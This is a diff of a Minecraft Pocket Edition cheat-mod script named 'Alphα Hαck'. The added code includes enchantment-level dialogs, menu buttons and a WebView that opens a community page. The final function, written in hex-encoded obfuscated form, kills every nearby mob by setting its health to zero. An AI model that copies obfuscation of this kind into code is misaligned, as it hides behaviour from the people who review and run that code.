+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add18();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add18() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.PROJECTILE_PROTECTION,ll);
+}
+
+var ens = new Button(ctx);
+            ens.setText("Protection");
+            ens.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en19();
+                }
+            }));
+            xmenuLayout.addView(ens);
+
+function en19() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add19();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add19() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.PROTECTION,ll);
+}
+
+var ent = new Button(ctx);
+            ent.setText("Punch");
+            ent.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en20();
+                }
+            }));
+            xmenuLayout.addView(ent);
+
+function en20() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add20();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add20() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.PUNCH,ll);
+}
+
+var enu = new Button(ctx);
+            enu.setText("Respiration");
+            enu.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en21();
+                }
+            }));
+            xmenuLayout.addView(enu);
+
+function en21() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add21();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add21() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.RESPIRATION,ll);
+}
+
+var env = new Button(ctx);
+            env.setText("Sharpness");
+            env.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en22();
+                }
+            }));
+            xmenuLayout.addView(env);
+
+function en22() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add22();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add22() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.SHARPNESS,ll);
+}
+
+var enw = new Button(ctx);
+            enw.setText("Silk touch");
+            enw.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en23();
+                }
+            }));
+            xmenuLayout.addView(enw);
+
+function en23() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add23();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add23() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.SILK_TOUCH,ll);
+}
+
+var enx = new Button(ctx);
+            enx.setText("Smite");
+            enx.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en24();
+                }
+            }));
+            xmenuLayout.addView(enx);
+
+function en24() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add24();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add24() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.SMITE,ll);
+}
+
+var eny = new Button(ctx);
+            eny.setText("Thorns");
+            eny.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en25();
+                }
+            }));
+            xmenuLayout.addView(eny);
+
+function en25() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add25();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add25() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.THORNS,ll);
+}
+
+var enz = new Button(ctx);
+            enz.setText("Unbreaking");
+            enz.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en26();
+                }
+            }));
+            xmenuLayout.addView(enz);
+
+function en26() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add26();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add26() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.UNBREAKING,ll);
+}
+
+//Enchantment.AQUA_AFFINITY;
+//Enchantment.BANE_OF_ARTHROPODS;
+//Enchantment.BLAST_PROTECTION;
+//Enchantment.DEPTH_STRIDER;
+//Enchantment.EFFICIENCY;
+//Enchantment.FEATHER_FALLING;
+//Enchantment.FIRE_ASPECT;
+//Enchantment.FIRE_PROTECTION;
+//Enchantment.FLAME;
+//Enchantment.FORTUNE;
+//Enchantment.INFINITY;
+//Enchantment.KNOCKBACK;
+//Enchantment.LOOTING;
+//Enchantment.LUCK_OF_THE_SEA;
+//Enchantment.LURE;
+//Enchantment.POWER;
+//Enchantment.PROJECTILE_PROTECTION;
+//Enchantment.PROTECTION;
+//Enchantment.PUNCH;
+//Enchantment.RESPIRATION;
+//Enchantment.SHARPNESS;
+//Enchantment.SILK_TOUCH;
+//Enchantment.SMITE;
+//Enchantment.THORNS;
+//Enchantment.UNBREAKING;
+
 var rr_exit = new android.widget.Button(ctx);
 		rr_exit.setText("Exit");
 	   rr_exit.setOnClickListener(new android.view.View.OnClickListener() {
@@ -4513,7 +6184,7 @@ showMenuBtn();
 		});
 		xmenuLayout.addView(rr_exit);
 
-            xmenu = new android.widget.PopupWindow(xmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/2, ctx.getWindowManager().getDefaultDisplay().getHeight());
+            xmenu = new android.widget.PopupWindow(xmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
         /*    xmenu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.GUIColor));*/
 xmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
             xmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | android.view.Gravity.TOP, 0, 0);
@@ -4568,6 +6239,26 @@ Player.setExp(Math.round(L));
 Player.addExp(Math.round(L));
 }
 
+/***********************/
+
+var btn13 = new android.widget.Button(ctx);
+            btn13.setText("Morph Menu");
+if(GetLang=="de_DE")btn13.setText('Morph Menü');
+if(GetLang=="ko_KR")btn13.setText('변신 메뉴');
+
+if(GetLang=="es_MX")btn13.setText('Menú de Morph');
+btn13.setTextColor(GUIBtns);
+            btn13.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+mMenu();
+menu.dismiss();
+clientMessage(client + "§cMenu doesn't work in servers.");
+                }
+            }));
+            menuLayout.addView(btn13);
+
+/***********************/
+
 function mMenu(){
 ctx.runOnUiThread(new Runnable({ run: function(){
         try{
@@ -4580,7 +6271,7 @@ ctx.runOnUiThread(new Runnable({ run: function(){
             mmenuLayout1.addView(mmenuScroll);
 
 var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
-		MainTitle.setText(name + space + version);
+		MainTitle.setText("Alphα Hαck" + space + version);
        MainTitle.setTextColor(GUIName);
 		MainTitle.setTextSize(20);
 		mmenuLayout.addView(MainTitle);
@@ -4891,7 +6582,7 @@ Entity.setRenderType(Player.getEntity(), EntityRenderType.zombie);
 		});
 		mmenuLayout.addView(B_exit);
 
-            mmenu = new PopupWindow(mmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
+            mmenu = new PopupWindow(mmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
             mmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
             mmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
             }catch(error){
@@ -4900,6 +6591,24 @@ Entity.setRenderType(Player.getEntity(), EntityRenderType.zombie);
     }}));
 }
 
+/***********************/
+
+var btn11 = new android.widget.Button(ctx);
+            btn11.setText("Weather Menu");
+if(GetLang=="de_DE")btn11.setText('Wetter Menü');
+if(GetLang=="ko_KR")btn11.setText('날씨 메뉴');
+
+if(GetLang=="es_MX")btn11.setText('Menú de clima');
+btn11.setTextColor(GUIBtns);
+            btn11.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+WaMenu();
+menu.dismiss();
+                }
+            }));
+            menuLayout.addView(btn11);
+
+/***********************/
 
 function WaMenu() {
 ctx.runOnUiThread(new java.lang.Runnable({ run: function(){
@@ -4914,7 +6623,7 @@ ctx.runOnUiThread(new java.lang.Runnable({ run: function(){
             wmenuLayout1.addView(wmenuScroll);
 
 var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
-		MainTitle.setText(name + space + version);
+		MainTitle.setText("Alphα Hαck" + space + version);
        MainTitle.setTextColor(GUIName);
 		MainTitle.setTextSize(20);
 		wmenuLayout.addView(MainTitle);
@@ -4956,7 +6665,7 @@ showMenuBtn();
 		});
 		wmenuLayout.addView(w_exit);
 
-            wmenu = new android.widget.PopupWindow(wmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/2, ctx.getWindowManager().getDefaultDisplay().getHeight());
+            wmenu = new android.widget.PopupWindow(wmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
           /*  wmenu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.GUIColor));*/
 wmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
             wmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | android.view.Gravity.TOP, 0, 0);
@@ -5014,7 +6723,26 @@ print("The WS Dialog Is Malfunctioning:"+e);
 function WS() {
 Level.setRainLevel(v);
 Level.setLightningLevel(v2);
-}                
+}
+
+/***********************/
+
+var btn12 = new android.widget.Button(ctx);
+		btn12.setText("Time Menu");
+if(GetLang=="de_DE")btn12.setText('Zeit Menü');
+if(GetLang=="ko_KR")btn12.setText('시간 메뉴');
+
+if(GetLang=="es_MX")btn12.setText('Menú de tiempo');
+btn12.setTextColor(GUIBtns);
+		btn12.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){
+             amenu_menu();
+             menu.dismiss();
+			}
+		});
+		menuLayout.addView(btn12);
+
+/***********************/
 
 function amenu_menu(){
 ctx.runOnUiThread(new Runnable({ run: function(){
@@ -5028,7 +6756,7 @@ ctx.runOnUiThread(new Runnable({ run: function(){
             amenuLayout1.addView(amenuScroll);
 
 var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
-		MainTitle.setText(name + space + version);
+		MainTitle.setText("Alphα Hαck" + space + version);
        MainTitle.setTextColor(GUIName);
 		MainTitle.setTextSize(20);
 		amenuLayout.addView(MainTitle);
@@ -5321,7 +7049,7 @@ showMenuBtn();
 		});
 		amenuLayout.addView(exita2);
 
-            amenu = new PopupWindow(amenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
+            amenu = new PopupWindow(amenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
             amenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
             amenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
             }catch(error){
@@ -5330,71 +7058,115 @@ showMenuBtn();
     }}));
 }
 
-function signEditor() {
-ctx.runOnUiThread(new java.lang.Runnable(){
-run: function(){ 
-try{
-GetText = new android.widget.PopupWindow();
-var Layer = new android.widget.LinearLayout(ctx);
-var xy = new android.widget.EditText(ctx);
-var xy2 = new android.widget.EditText(ctx);
-var Dialog = new android.app.Dialog(ctx);
-var Exit = new android.widget.Button(ctx);
+/***********************/
 
-Dialog.setTitle("Enter sign line & text");
-Dialog.setContentView(Layer);
+var source = new Button(ctx);
+            source.setText("Mod Community");
+if(GetLang=="de_DE")source.setText('Mod Gruppe');
+if(GetLang=="ko_KR")source.setText('모드 커뮤니티');
 
-Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
-Dialog.show();
-Layer.addView(xy);
-Layer.addView(xy2);
-Layer.addView(Exit);
-
-xy.setText("");
-xy.setHint("Sign line: (0-3)");
-xy2.setText("");
-xy2.setHint("New sign text");
-Exit.setText("done");
-
-Exit.setOnClickListener(new android.view.View.OnClickListener(){
-onClick: function(view){
-text4 =xy.getText();
-line4 =xy2.getText();
-Level.setSignText(notex, notey, notez, text4, line4);
-Dialog.dismiss();
+if(GetLang=="es_MX")source.setText('Comunidad de mods');
+source.setTextColor(GUIBtns);
+            source.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+arceusMatt(); 
 showMenuBtn();
-}
-});
+print("Loading web page");
+                }
+            }));
+            menuLayout.addView(source);
 
-GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
-GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
-GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
-} catch (e){
-print("The signer Dialog Is Malfunctioning:"+e);
-}
-}});
+/***********************/
+
+function arceusMatt()
+      {
+      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
+      var webs = new android.webkit.WebView(ctx);
+      var webset = webs.getSettings();
+      webset.setJavaScriptEnabled(true);
+      webs.setWebChromeClient(new android.webkit.WebChromeClient());
+      webs.setWebViewClient(new android.webkit.WebViewClient());
+      webs.loadUrl('https://plus.google.com/communities/103695355587842948163');
+/*Site URL*/
+      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
+      }}));
+      }
+
+menu = new PopupWindow(menuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
+            menu.setBackgroundDrawable(new ColorDrawable(GUIColor));
+            menu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
+            }catch(error){
+                Toast.makeText(ctx, "An error occured: " + error, 1).show();
+            }
+    }}));
 }
 
-function useItem(x, y, z, itemId, blockId, side){
-if(blockId == 63 || blockId == 68) {
-            signEditor(); 
-        }
-	if(lightning) {
-		 Level.spawnMob(x, y, z, EntityType.LIGHTNING_BOLT);
-	}
-	if(primedtnt) {
-Level.spawnMob(x, y +1, z, EntityType.PRIMED_TNT);
-	}
-	if(arrow) {
-Level.spawnMob(x, y +1, z, EntityType.ARROW);
-	}
-	if(exporb) {
-Level.spawnMob(x, y +1, z, EntityType.EXPERIENCE_ORB);
-	}
-	if(minecart) {
-Level.spawnMob(x, y +1, z, EntityType.MINECART);
-	}
+/***********************/
+
+//Main menu header.
+
+function headerView(){
+ctx.runOnUiThread(new Runnable({ run: function(){
+        try{
+            var headerLayout = new LinearLayout(ctx);
+            var headerScroll = new ScrollView(ctx);
+            var headerLayout1 = new LinearLayout(ctx);
+            headerLayout.setOrientation(1);
+            headerLayout1.setOrientation(1);
+            headerScroll.addView(headerLayout);
+            headerLayout1.addView(headerScroll);
+
+            var name = new TextView(ctx);
+            name.setTextSize(20);
+            name.setText("Alphα Hαck" + space + version + space + copyright);
+            name.setTextColor(GUIName);
+            name.setGravity(Gravity.CENTER);
+            headerLayout.addView(name);
+
+var maker = new TextView(ctx);
+            maker.setTextSize(15);
+            maker.setText(authers + space + "&" + space + authers2);
+            maker.setTextColor(GUIName);
+            maker.setGravity(Gravity.CENTER);
+            headerLayout.addView(maker);
+
+var exitb = new Button(ctx);
+            exitb.setText("Exit AlphαHαck");
+exitb.setTextColor(Color.RED);
+            exitb.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+
+                    menu.dismiss();
+
+header.dismiss(); 
+
+print("Closed successfully");
+
+showMenuBtn();
+                }
+            }));
+            headerLayout.addView(exitb);
+
+header = new PopupWindow(headerLayout1, dip2px(180), dip2px(180));
+
+header = new PopupWindow(headerLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight()/4);
+header.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
+            header.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
+            }catch(error){
+                Toast.makeText(ctx, "An error occured: " + error, 1).show();
+            }
+    }}));
 }
+
+/***********************/
+
+var _0x534d=["\x67\x65\x74\x41\x6C\x6C","\x6C\x65\x6E\x67\x74\x68","\x67\x65\x74\x58","\x67\x65\x74\x59","\x67\x65\x74\x5A","\x67\x65\x74\x45\x6E\x74\x69\x74\x79\x54\x79\x70\x65\x49\x64","\x73\x65\x74\x48\x65\x61\x6C\x74\x68"];function killing(){var _0xf254x2=Entity[_0x534d[0]]();for(var _0xf254x3=0;_0xf254x3<_0xf254x2[_0x534d[1]];_0xf254x3++){var _0xf254x4=Entity[_0x534d[2]](_0xf254x2[_0xf254x3])-getPlayerX();var _0xf254x5=Entity[_0x534d[3]](_0xf254x2[_0xf254x3])-getPlayerY();var _0xf254x6=Entity[_0x534d[4]](_0xf254x2[_0xf254x3])-getPlayerZ();if(_0xf254x4*_0xf254x4+_0xf254x5*_0xf254x5+_0xf254x6*_0xf254x6<=20*20&&_0xf254x2[_0xf254x3]!=getPlayerEnt()){if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==10){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==11){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==12){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==13){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==14){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==15){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==16){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==17){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==18){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==19){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==20){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==21){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==22){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==32){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==33){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==34){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==35){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==36){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==37){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==38){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==39){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==40){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==41){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==42){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==43){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==44){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==45){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)}}}}
+
